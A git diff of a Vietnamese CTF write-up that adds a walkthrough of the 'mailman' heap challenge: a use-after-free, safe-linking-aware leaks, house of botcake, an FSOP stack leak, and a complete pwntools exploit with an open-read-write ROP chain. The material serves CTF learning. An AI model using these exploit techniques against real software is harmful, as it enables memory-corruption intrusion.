@@ -485,7 +485,7 @@ log.info(f'stdout: {hex(stdout)}')
 
 - ta có thể thấy nó như sau , lúc này nếu ta free() chunk ở kế tiếp nó , nó sẽ đi tìm chunk free liền kề và 2 thằng này sẽ được hợp nhất với nhau 
 
-```cscs
+```cs
 0x5558b5d9ca00  0x0000000000000000      0x0000000000000111      ................         <-- unsortedbin[all][0]
 0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
 0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
@@ -778,7 +778,7 @@ FINALLY !!!
 
 full exp : 
 
-```
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -895,3 +895,380 @@ ref :
 
 [safe_linking](https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/)
 
+
+
+## mailman
+
+
+- 1 bài heap kết hợp seccomp  
+
+### overview
+
+- đầu tiên ta có thể thấy nó setup ```seccomp``` ta sẽ check nó sau , tiếp theo ta có 3 option ```write , send and read```
+
+```cs
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  void *ptr; // rax
+  int choice; // [rsp+Ch] [rbp-24h] BYREF
+  size_t size; // [rsp+10h] [rbp-20h] BYREF
+  __int64 v6; // [rsp+18h] [rbp-18h]
+  __int64 v7; // [rsp+20h] [rbp-10h]
+  unsigned __int64 v8; // [rsp+28h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  v6 = seccomp_init(0LL, argv, envp);
+  seccomp_rule_add(v6, 2147418112LL, 2LL, 0LL);
+  seccomp_rule_add(v6, 2147418112LL, 0LL, 0LL);
+  seccomp_rule_add(v6, 2147418112LL, 1LL, 0LL);
+  seccomp_rule_add(v6, 2147418112LL, 5LL, 0LL);
+  seccomp_rule_add(v6, 2147418112LL, 60LL, 0LL);
+  seccomp_load(v6);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  puts("Welcome to the post office.");
+  puts("Enter your choice below:");
+  puts("1. Write a letter");
+  puts("2. Send a letter");
+  puts("3. Read a letter");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      printf("> ");
+      __isoc99_scanf("%d%*c", &choice);
+      if ( choice != 3 )
+        break;
+      v7 = inidx();
+      puts(*((const char **)&mem + v7));
+    }
+    if ( choice > 3 )
+      break;
+    if ( choice == 1 )
+    {
+      v7 = inidx();
+      printf("letter size: ");
+      __isoc99_scanf("%lu%*c", &size);
+      ptr = malloc(size);
+      *((_QWORD *)&mem + v7) = ptr;
+      printf("content: ");
+      fgets(*((char **)&mem + v7), size, stdin);
+    }
+    else
+    {
+      if ( choice != 2 )
+        break;
+      v7 = inidx();
+      free(*((void **)&mem + v7));
+    }
+  }
+  puts("Invalid choice!");
+  _exit(0);
+}
+```
+
+- seccomp : 
+
+ta sẽ chỉ có thể dùng orw ở bài này 
+
+```cscs
+ploi@PhuocLoiiiii:~/pwn/FSOP/imaginary$ seccomp-tools dump ./vuln_patched
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
+ 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+- option1 : writewrite
+
+nhập 1 size và gọi malloc(size)  , tiếp theo là nhập dữ liệu vào chunk
+
+```cs
+ if ( choice == 1 )
+    {
+      v7 = inidx();
+      printf("letter size: ");
+      __isoc99_scanf("%lu%*c", &size);
+      ptr = malloc(size);
+      *((_QWORD *)&mem + v7) = ptr;
+      printf("content: ");
+      fgets(*((char **)&mem + v7), size, stdin);
+```
+
+- option2 : send
+
+nhập 1 idx và free chunk[idx]
+
+```cs
+   if ( choice != 2 )
+        break;
+      v7 = inidx();
+      free(*((void **)&mem + v7));
+```
+
+- option3 : read
+
+ta sẽ được đọc dữ liệu tại chunk 
+
+```cs
+ if ( choice != 3 )
+        break;
+      v7 = inidx();
+      puts(*((const char **)&mem + v7));
+```
+
+### EXPLOIT
+
+- ta sẽ có bug ```UAF``` ở option 3 , libc version được sử dụng ở bài này là ```2.35``` đây là 1 phiên bản không còn sử dung ```hook``` được nữa , cùng với setup ```seccomp``` khiến ta chỉ có thể ```orw``` để đọc flag 
+
+- trước hết ta sẽ setup 1 số hàm để giúp khai thác rõ ràng hơn: 
+
+```cs
+def malloc(idx,size,data):
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter((b'idx: ',f'{idx}'.encode()))
+    p.sendlineafter(b'size: ',f'{size}'.encode())
+    p.sendlineafter(b'content: ',data)
+
+def free(idx):
+    p.sendlineafter(b'> ',b'2')
+    p.sendlineafter(b'idx: ',f'{idx}'.encode())
+def view(idx):
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'idx: ',f'{idx}'.encode())
+```
+
+- trước hết ta sẽ cần leak libc và heap_address , leak ```heap``` vì 2.35 sử dụng ```safe_linking``` :
+
+```cs
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
+```
+
+- vì bug ```uaf``` và hàm read cũng không check gì nên ta có thể leak libc và heap dễ dàng như sau: 
+
+```cs
+for i in range(7): malloc(i,0x100,b'')
+
+free(0)
+view(0)
+
+heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000 - 0x2000
+log.info(f'heap_base: {hex(heap_base)}')
+```
+- tuy nhiên trong bins lúc này khá lộn xộn , ```tcache``` là 1 mảng dslk lưu trữ các chunk được giải phóng trên cơ sở mỗi luồng , các dslk dược lập chỉ mục theo thứ tự theo các chunk từ 16-1032 byte . tuy nhiên seccomp đã phân bổ và giải phóng rất nhiều bộ nhớ trước đó nên nó xảy ra sự lộn xộn này 
+
+```cs
+pwndbg> bins
+tcachebins
+0x20 [  7]: 0x55555555cfd0 —▸ 0x55555555d280 —▸ 0x55555555c750 —▸ 0x55555555ce30 —▸ 0x55555555cc90 —▸ 0x55555555caf0 —▸ 0x55555555c6c0 ◂— 0
+0x70 [  6]: 0x55555555cb30 —▸ 0x55555555ccd0 —▸ 0x55555555ce70 —▸ 0x55555555d010 —▸ 0x55555555d190 —▸ 0x55555555c6e0 ◂— 0
+0x80 [  7]: 0x55555555c8f0 —▸ 0x55555555ca70 —▸ 0x55555555cc10 —▸ 0x55555555cdb0 —▸ 0x55555555cf50 —▸ 0x55555555d200 —▸ 0x55555555c640 ◂— 0
+0xd0 [  5]: 0x55555555c170 —▸ 0x55555555be40 —▸ 0x55555555bb10 —▸ 0x55555555b7e0 —▸ 0x55555555b350 ◂— 0
+0xf0 [  2]: 0x55555555d080 —▸ 0x55555555c370 ◂— 0
+fastbins
+0x20: 0x55555555c490 —▸ 0x55555555c5a0 —▸ 0x55555555c8c0 —▸ 0x55555555c960 —▸ 0x55555555cb00 —▸ 0x55555555cca0 —▸ 0x55555555ce40 —▸ 0x55555555cfe0 ◂— ...
+0x70: 0x55555555d290 —▸ 0x55555555c4b0 —▸ 0x55555555c5c0 —▸ 0x55555555c7d0 —▸ 0x55555555ced0 —▸ 0x55555555cd30 —▸ 0x55555555cb90 —▸ 0x55555555c9f0 ◂— ...
+0x80: 0x55555555c520 —▸ 0x55555555c840 ◂— 0
+unsortedbin
+empty
+smallbins
+empty
+largebins
+empty
+```
+
+- tiếp theo ta lại sử dụng ```house_of_botcake``` để có được đọc và ghi tùy ý (đọc lại bài trước để xem kĩ hơn)
+
+- ta sẽ malloc 7 chunk , 2 chunk tiếp theo cho việc gộp chunk và 1 chunk tránh gộp chunk : 
+
+cái for 20 đó là mình muốn dẹp sạch mấy thằng trong bins =)))
+
+```cs
+malloc(0,0x100,b'')
+malloc(7,0x100,b'')
+malloc(8,0x100,b'')
+
+
+for i in range(7): free(i)
+for i in range(20): malloc(9,0x10,b'flag.txt\0')
+
+free(8)
+
+view(8)
+libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
+log.info(f'libc: {hex(libc.address)}')
+log.info(f'stdout: {hex(libc.address+0x21a780)}')
+
+free(7)
+```
+
+- lúc này việc gộp chunk hoàn tất , ta sẽ malloc để tcache lấy đi 1 chunk và free() chunk thứ 8 vào , để khi ta malloc chunk thứ 7 ta có thể overwrite ```fd``` chunk thứ 8
+
+```cs
+malloc(0,0x100,b'')
+free(8)
+
+payload = b'a'*0x108 + p64(0x111) + p64(libc.address+0x21a780 ^ (heap_base+0x2b90>>12))
+malloc(1,0x130,payload)
+```
+
+- tiếp theo là ```leak_stack``` cho việc sử dụng ```rop_chain``` orw để lấy flag , tuy nhiên ở đây nó sử dụng ```_exit()``` ở main nên ta có thể overwrite ```saved_rip``` của ```fgets``` hoặc ```printf``` chẵn hạn , ở đây mình chọn ```fgets``` vì sau khi input()  xong thì nó return về ```rop_chain``` của mình luôn
+
+- saved_rbp_fgets ở đây thực ra nó không phải là ```saved_rbp``` của fgets , lúc đầu mình tính toán như vậy nhưng malloc() nó cần địa chỉ ```alignment``` nên mình debug dần và sửa lạilại
+
+```cs
+malloc(2,0x100,b'nothing')
+'''
+payload2 = flat(
+        0xfbad1800, # _flags
+        libc.sym.environ, # _IO_read_ptr
+        libc.sym.environ, # _IO_read_end
+        libc.sym.environ, # _IO_read_base
+        libc.sym.environ, # _IO_write_base
+        libc.sym.environ + 0x8, # _IO_write_ptr
+        libc.sym.environ + 0x8, # _IO_write_end
+        libc.sym.environ + 0x8, # _IO_buf_base
+        libc.sym.environ + 8, # _IO_buf_end
+        )
+'''
+payload2 = p64(0xfbad1800) + p64(libc.sym.environ)*4 + p64(libc.sym.environ+8)*4
+print(payload2)
+malloc(3,0x100,payload2)
+
+stack_leak = u64(p.recv(6).ljust(8,b'\x00'))
+log.info(f'stack: {hex(stack_leak)}')
+
+saved_rbp_fgets = stack_leak - (0x188)
+```
+
+- cuối cùng là free() 2 chunk lúc nãy và dùng rop_chain lấy flag ^^
+
+exp: 
+
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./vuln_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+context.binary = exe
+
+p = process()
+
+def malloc(idx,size,data):
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'idx: ',f'{idx}'.encode())
+    p.sendlineafter(b'size: ',f'{size}'.encode())
+    p.sendlineafter(b'content: ',data)
+
+def free(idx):
+    p.sendlineafter(b'> ',b'2')
+    p.sendlineafter(b'idx: ',f'{idx}'.encode())
+def view(idx):
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'idx: ',f'{idx}'.encode())
+
+for i in range(7): malloc(i,0x100,b'')
+
+free(0)
+view(0)
+
+heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000 - 0x2000
+log.info(f'heap_base: {hex(heap_base)}')
+
+malloc(0,0x100,b'')
+malloc(7,0x100,b'')
+malloc(8,0x100,b'')
+
+
+for i in range(7): free(i)
+for i in range(20): malloc(9,0x10,b'flag.txt\0')
+
+free(8)
+
+view(8)
+libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
+log.info(f'libc: {hex(libc.address)}')
+log.info(f'stdout: {hex(libc.address+0x21a780)}')
+
+free(7)
+
+malloc(0,0x100,b'')
+free(8)
+
+payload = b'a'*0x108 + p64(0x111) + p64(libc.address+0x21a780 ^ (heap_base+0x2b90>>12))
+malloc(1,0x130,payload)
+malloc(2,0x100,b'nothing')
+'''
+payload2 = flat(
+        0xfbad1800, # _flags
+        libc.sym.environ, # _IO_read_ptr
+        libc.sym.environ, # _IO_read_end
+        libc.sym.environ, # _IO_read_base
+        libc.sym.environ, # _IO_write_base
+        libc.sym.environ + 0x8, # _IO_write_ptr
+        libc.sym.environ + 0x8, # _IO_write_end
+        libc.sym.environ + 0x8, # _IO_buf_base
+        libc.sym.environ + 8, # _IO_buf_end
+        )
+'''
+payload2 = p64(0xfbad1800) + p64(libc.sym.environ)*4 + p64(libc.sym.environ+8)*4
+print(payload2)
+malloc(3,0x100,payload2)
+
+stack_leak = u64(p.recv(6).ljust(8,b'\x00'))
+log.info(f'stack: {hex(stack_leak)}')
+
+saved_rbp_fgets = stack_leak - (0x188)
+log.info(f'saved_rbp_fgets: {hex(saved_rbp_fgets)}')
+pop_rsi = 0x000000000002be51+libc.address
+pop_rdi = 0x000000000002a3e5 + libc.address
+pop_rdx_rbx = 0x0000000000090529 + libc.address
+pop_rax = 0x0000000000045eb0 + libc.address
+syscall = 0x0000000000091396 + libc.address
+free(8)
+free(7)
+payload = b'a'*0x108 + p64(0x111) + p64(saved_rbp_fgets ^ (heap_base+0x2b90>>12))
+malloc(3,0x130,payload)
+malloc(4,0x100,b'nothing')
+
+rop_chain = b'./flag.txt\x00'
+rop_chain = rop_chain.ljust(40,b'a')
+# open(./flag.txt,0,0)
+rop_chain += p64(pop_rdi) + p64(saved_rbp_fgets)
+rop_chain += p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0)*2
+rop_chain += p64(pop_rax) + p64(2) + p64(syscall)
+# read(3,buf,size)
+rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rax) + p64(0)
+rop_chain += p64(pop_rsi) + p64(saved_rbp_fgets) + p64(pop_rdx_rbx) + p64(0x100) + p64(0) + p64(syscall)
+# write(1,buf,size)
+rop_chain += p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall)
+input()
+malloc(5,0x100,rop_chain)
+
+p.interactive()
+```
+
+![here](/assets/images/flag20.png)
+
+ref : 
+
+[here](https://ret2school.github.io/post/mailman/)
+
+[here](https://surg.dev/ictf23/)
